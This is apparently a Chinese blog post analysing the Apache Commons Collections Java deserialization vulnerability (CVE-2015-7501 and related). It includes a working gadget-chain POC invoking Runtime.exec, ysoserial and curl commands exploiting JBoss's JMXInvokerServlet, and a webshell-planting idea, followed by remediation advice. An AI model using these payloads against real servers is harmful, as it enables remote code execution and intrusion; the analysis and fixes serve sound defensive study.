这个类完全符合我们的要求，那么，我们的思路就非常清晰了\n　　1）首先构造一个Map和一个能够执行代码的ChainedTransformer，　　2）生成一个TransformedMap实例　　3）实例化AnnotationInvocationHandler，并对其进行序列化，　　4）当触发readObject()反序列化的时候，就能实现命令执行。\n\n　　POC执行流程为 TransformedMap-&gt;AnnotationInvocationHandler.readObject()-&gt;setValue()- 漏洞成功触发\n我们回顾下所有用到的技术细节\n(1)java方法重写：如果一个类的方法被重写，那么调用该方法时优先调用该方法(2)JAVA反射机制：在运行状态中　　　　　　　　　　　　　对于任意一个类，都能够判断一个对象所属的类；　　　　　　　　　　　　　对于任意一个类，都能够知道这个类的所有属性和方法；　　　　　　　　　  　 　对于任意一个对象，都能够调用它的任意一个方法和属性；(3)认识关键类与函数    TransformedMap ：      利用其value修改时触发transform()的特性    ChainedTransformer： 会挨个执行我们定义的Transformer    Transformer:                 存放我们要执行的命令    AnnotationInvocationHandler：对memberValues的每一项调用了setValue()函数\n\n具体实现\nimport java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;import java.util.Map.Entry;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;public class POC_Test&#123;    public static void main(String[] args) throws Exception &#123;        //execArgs: 待执行的命令数组        //String[] execArgs = new String[] &#123; &quot;sh&quot;, &quot;-c&quot;, &quot;whoami &gt; /tmp/fuck&quot; &#125;;        //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组        Transformer[] transformers = new Transformer[] &#123;            new ConstantTransformer(Runtime.class),            /*            由于Method类的invoke(Object obj,Object args[])方法的定义            所以在反射内写new Class[] &#123;Object.class, Object[].class &#125;            正常POC流程举例：            ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(&quot;gedit&quot;);            */            new InvokerTransformer(                &quot;getMethod&quot;,                new Class[] &#123;String.class, Class[].class &#125;,                new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;            ),            new InvokerTransformer(                &quot;invoke&quot;,                new Class[] &#123;Object.class,Object[].class &#125;,                 new Object[] &#123;null, null &#125;            ),            new InvokerTransformer(                &quot;exec&quot;,                new Class[] &#123;String[].class &#125;,                new Object[] &#123; &quot;whoami&quot; &#125;                //new Object[] &#123; execArgs &#125;             )        &#125;;        //transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作        Transformer transformedChain = new ChainedTransformer(transformers);        //BeforeTransformerMap: Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict        //Map&lt;String, String&gt; BeforeTransformerMap = new HashMap&lt;String, String&gt;();        Map&lt;String,String&gt; BeforeTransformerMap = new HashMap&lt;String,String&gt;();        BeforeTransformerMap.put(&quot;hello&quot;, &quot;hello&quot;);        //Map数据结构，转换后的Map       /*       TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。            第一个参数为待转化的Map对象            第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）            第三个参数为Map对象内的value要经过的转化方法。       */        //TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);        Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);        ctor.setAccessible(true);        Object instance = ctor.newInstance(Target.class, AfterTransformerMap);        File f = new File(&quot;temp.bin&quot;);        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));        out.writeObject(instance);    &#125;&#125;/*思路:构建BeforeTransformerMap的键值对，为其赋值，     利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme     对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行     执行本质: ((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(.........)     利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()*/\n\n漏洞挖掘1.漏洞触发场景   在java编写的web应用与web服务器间java通常会发送大量的序列化对象例如以下场景：　　1)HTTP请求中的参数，cookies以及Parameters。　　2)RMI协议，被广泛使用的RMI协议完全基于序列化　　4)JMX 同样用于处理序列化对象　　5)自定义协议 用来接收与发送原始的java对象2. 漏洞挖掘　　(1)确定反序列化输入点　　　　首先应找出readObject方法调用，在找到之后进行下一步的注入操作。一般可以通过以下方法进行查找：　　　　  1)源码审计：寻找可以利用的“靶点”，即确定调用反序列化函数readObject的调用地点。　　     2)对该应用进行网络行为抓包，寻找序列化数据，如wireshark,tcpdump等　　　  注： java序列化的数据一般会以标记（ac ed 00 05）开头，base64编码后的特征为rO0AB。　　(2)再考察应用的Class Path中是否包含Apache Commons Collections库　　(3)生成反序列化的payload　　(4)提交我们的payload数据\n\n相关工具　　ysoserial是一个用我们刚才的思路生成序列化payload数据的工具。当中针对Apache Commons Collections 3的payload也是基于TransformedMap和InvokerTransformer来构造的，然而在触发时，并没有采用上文介绍的AnnotationInvocationHandler，而是使用了java.lang.reflect.Proxy中的相关代码来实现触发。此处不再做深入分析，有兴趣的读者可以参考ysoserial的源码。\n获取方法去github上下载jar发行版：https://github.com/frohoff/ysoserial/releaseswget https://github.com/frohoff/ysoserial/releases/download/v0.0.2/ysoserial-0.0.2-all.jar或者自行编译：git　clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -DskipTests\n\n相关Tool链接\n　　https://github.com/frohoff/ysoserial\n　　https://github.com/CaledoniaProject/jenkins-cli-exploit \n　　https://github.com/foxglovesec/JavaUnserializeExploits\nysoserial去github上下载jar发行版：https://github.com/frohoff/ysoserial/releases或者自行编译：git　clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -DskipTests 没有mvn的话需要先安装：sudo apt-get install maven\n\n实际漏洞环境测试JBOSSJBoss是一个管理和运行EJB项目的容器和服务器Enterprise JavaBean (EJB)规范定义了开发和部署基于事务性、分布式对象应用程序的服务器端软件组件的体系结构。企业组织可以构建它们自己的组件，或从第三方供应商购买组件。这些服务器端组件称作 Enterprise Bean，它们是 Enterprise JavaBean 容器中驻留的分布式对象，为分布在网络中的客户机提供远程服务。\n\n\n实际测试版本\nJboss6.1Download: http://jbossas.jboss.org/downloads/Unzip: unzip jboss-as-7.1.1.Final.zip修改配置文件，修改默认访问端口，设置外部可访问 vi  /server/default/deploy/jbossweb.sar/server.xml运行服务iptables -I INPUT -p tcp --dport 80 -j ACCEPTsh jbosspath/bin/run.sh -b 0.0.0.0        关闭服务器sh jbosspath/bin/shutdown.sh -S测试http://ip:8080http://ip:8080/web-console\n\n　补充：CentOS默认开启了防火墙，所以80端口是不能正常访问的)，输入命令：\n　iptables -I INPUT -p tcp --dport 80 -j ACCEPT\n\n　　这里以Jboss为例。Jboss利用的是HTTP协议，可以在任何端口上运行，默认安装在8080端口中。\n　　Jboss与“JMXInvokerServlet”的通信过程中存在一个公开漏洞。JMX是一个java的管理协议，在Jboss中的JMXInvokerServlet可以使用HTTP协议与其进行通话。这一通信功能依赖于java的序列化类。在默认安装的Jboss中，JMXInvokerServlet的路径恰好为http://localhost:8080/invoker/JMXInvokerServlet。\n　　如果用户访问一个该url，实际上会返回一个原始的java对象，这种行为显然存在一个漏洞。但由于jmxinvokerservlet与主要的Web应用程序在同一个端口上运行，因此它很少被防火墙所拦截这个漏洞可以很经常的通过互联网被利用。\n　　因此，可以以jmx作为Jboss接受外部输入的点，可以利用java HTTP client包构建POST请求，post请求包中数据为使用ysoserial处理之后的构建代码\n通常的测试可以使用的命令\n搜索匹配&quot;readObject&quot;靶点　　 grep -nr &quot;readObject&quot; *测试是否含该漏洞的jar包文件    grep -R InvokerTransformer生成序列化payload数据    java -jar ysoserial-0.0.4-all.jar CommonsCollections1 &#x27;想要执行的命令&#x27; &gt; payload.out提交payload数据　　curl --header &#x27;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&#x27; --data-binary &#x27;@payload.out&#x27; http://ip:8080/invoker/JMXInvokerServletexploit例子java -jar  ysoserial-0.0.2-all.jar   CommonsCollections1  &#x27;echo 1 &gt; /tmp/pwned&#x27;  &gt;  payloadcurl --header &#x27;Content-Type: application/x-java-serialized-object; class=&quot;org&quot;.jboss.invocation.MarshalledValue&#x27; --data-binary &#x27;@/tmp/payload&#x27; http://127.0.0.1:8080/invoker/JMXInvokerServlet\n\n我们提交payload数据时，可以抓取数据包进行分析，看起来大概像这个样子（图片不是自己环境测试中的）\n \n\n总结\n漏洞分析　　引发：如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。　　　　原因: 类ObjectInputStream在反序列化时，没有对生成的对象的输入做限制，使攻击者利用反射调用函数进行任意命令执行。　　　　　CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法　　　　根源：Apache Commons Collections允许链式的任意的类函数反射调用　　　　　问题函数：org.apache.commons.collections.Transformer接口　　利用：要利用Java反序列化漏洞，需要在进行反序列化的地方传入攻击者的序列化代码。　　思路：攻击者通过允许Java序列化协议的端口，把序列化的攻击代码上传到服务器上，再由Apache Commons Collections里的TransformedMap来执行。　  至于如何使用这个漏洞对系统发起攻击，举一个简单的思路，通过本地java程序将一个带有后门漏洞的jsp（一般来说这个jsp里的代码会是文件上传和网页版的SHELL）序列化，将序列化后的二进制流发送给有这个漏洞的服务器，服务器会反序列化该数据的并生成一个webshell文件，然后就可以直接访问这个生成的webshell文件进行进一步利用。 \n\n 启发\n开发者：　　为了确保序列化的安全性，可以对于一些敏感信息加密；　　确保对象的成员变量符合正确的约束条件；　　确保需要优化序列化的性能。漏洞挖掘：　　(1)通过代码审计/行为分析等手段发现漏洞所在靶点　　(2)进行POC分析构造时可以利用逆推法\n\n漏洞修补Java反序列化漏洞的快速排查和修复方案目前打包有apache commons collections库并且应用比较广泛的主要组件有Jenkins WebLogic Jboss WebSphere  OpenNMS。其中Jenkins由于功能需要大都直接暴露给公网。首先确认产品中是否包含上述5种组件使用grep命令或者其他相关搜索命令检测上述组件安装目录是否包含库Apache Commons Collections。搜索下列jar。commons-collections.jar*.commons-collections.jarapache.commons.collections.jar*.commons-collections.*.jar如果包含请参考下述解决方案进行修复。\n\n通用解决方案\n更新Apache Commons Collections库　　Apache Commons Collections在 3.2.2版本开始做了一定的安全处理，新版本的修复方案对相关反射调用进行了限制，对这些不安全的Java类的序列化支持增加了开关。NibbleSecurity公司的ikkisoft在github上放出了一个临时补丁SerialKiller　　lib地址:https://github.com/ikkisoft/SerialKiller　　下载这个jar后放置于classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller　　之后配置让其能够允许或禁用一些存在问题的类，SerialKiller有Hot-Reload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。\n\n　　严格意义说起来，Java相对来说安全性问题比较少，出现的一些问题大部分是利用反射，最终用Runtime.exec(String cmd)函数来执行外部命令的。\n　　如果可以禁止JVM执行外部命令，未知漏洞的危害性会大大降低，可以大大提高JVM的安全性。比如：\nSecurityManager originalSecurityManager = System.getSecurityManager();    if (originalSecurityManager == null) &#123;        // 创建自己的SecurityManager        SecurityManager sm = new SecurityManager() &#123;        private void check(Permission perm) &#123;            // 禁止exec            if (perm instanceof java.io.FilePermission) &#123;                String actions = perm.getActions();                if (actions != null &amp;&amp; actions.contains(&quot;execute&quot;)) &#123;                    throw new SecurityException(&quot;execute denied!&quot;);                &#125;            &#125;            // 禁止设置新的SecurityManager            if (perm instanceof java.lang.RuntimePermission) &#123;                String name = perm.getName();                if (name != null &amp;&amp; name.contains(&quot;setSecurityManager&quot;)) &#123;                    throw new SecurityException(                    &quot;System.setSecurityManager denied!&quot;);                &#125;            &#125;        &#125;        @Override        public void checkPermission(Permission perm) &#123;            check(perm);        &#125;        @Override        public void checkPermission(Permission perm, Object context) &#123;            check(perm);        &#125;    &#125;;   System.setSecurityManager(sm);&#125;\n\n　　如上所示，只要在Java代码里简单加一段程序，就可以禁止执行外部程序了。 \n　　禁止JVM执行外部命令，是一个简单有效的提高JVM安全性的办法。可以考虑在代码安全扫描时，加强对Runtime.exec相关代码的检测。\n针对其他的Web Application的修复\nWeblogic影响版本：Oracle WebLogic Server, 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0 版本。临时解决方案1 使用 SerialKiller 替换进行序列化操作的 ObjectInputStream 类；2 在不影响业务的情况下，临时删除掉项目里的“org/apache/commons/collections/functors/InvokerTransformer.class” 文件；官方解决方案官方声明: http://www.oracle.com/technetwork/topics/security/alert-cve-2015-4852-2763333.htmlWeblogic 用户将收到官方的修复支持Jboss临时解决方案1 删除 commons-collections jar 中的 InvokerTransformer, InstantiateFactory, 和InstantiateTransfromer class 文件官方解决方案https://issues.apache.org/jira/browse/COLLECTIONS-580https://access.redhat.com/solutions/2045023jenkins临时解决方案　　1 使用 SerialKiller 替换进行序列化操作的 ObjectInputStream 类；　　2 在不影响业务的情况下，临时删除掉项目里的“org/apache/commons/collections/functors/InvokerTransformer.class” 文件；官方解决方案： Jenkins 发布了 安全公告 ，并且在1.638版本中修复了这个漏洞。官方的补丁声明链接:https://jenkins-ci.org/content/mitigating-unauthenticated-remote-code-execution-0-day-jenkins-clihttps://github.com/jenkinsci-cert/SECURITY-218websphere　　Version8.0，Version7.0，Version8.5 and 8.5.5 Full Profile and Liberty Profile临时解决方案1 使用 SerialKiller 替换进行序列化操作的 ObjectInputStream 类；2 在不影响业务的情况下，临时删除掉项目里的“org/apache/commons/collections/functors/InvokerTransformer.class” 文件在服务器上找org/apache/commons/collections/functors/InvokerTransformer.class类的jar，目前weblogic10以后都在Oracle/Middleware/modules下　　　　com.bea.core.apache.commons.collections_3.2.0.jar，创建临时目录tt，解压之后删除InvokerTransformer.class类后再改成com.bea.core.apache.commons.collections_3.2.0.jar覆盖Oracle/Middleware/modules下，重启所有服务。如下步骤是linux详细操作方法：A)mkdir ttB)cp -r Oracle/Middleware/modules/com.bea.core.apache.commons.collections_3.2.0.jar ./ttC)jar xf Oracle/Middleware/modules/com.bea.core.apache.commons.collections_3.2.0.jarD)cd org/apache/commons/collections/functorsE)rm -rf InvokerTransformer.classF)jar cf com.bea.core.apache.commons.collections_3.2.0.jar org/* META-INF/*G)mv com.bea.core.apache.commons.collections_3.2.0.jar Oracle/Middleware/modules/H)重启服务重启服务时候要删除server-name下的cache和tmp例如rm -rf ~/user_projects/domains/base_domain/servers/AdminServer/cacherm -rf  ~/user_projects/domains/base_domain/servers/AdminServer/tmp\n\n相关CVE\nCVE-2015-7501\nCVE-2015-4852(Weblogic)\nCVE-2015-7450(Websphere)\n\n","categories":["漏洞分析"],"tags":["Java反序列化","Java安全"]}]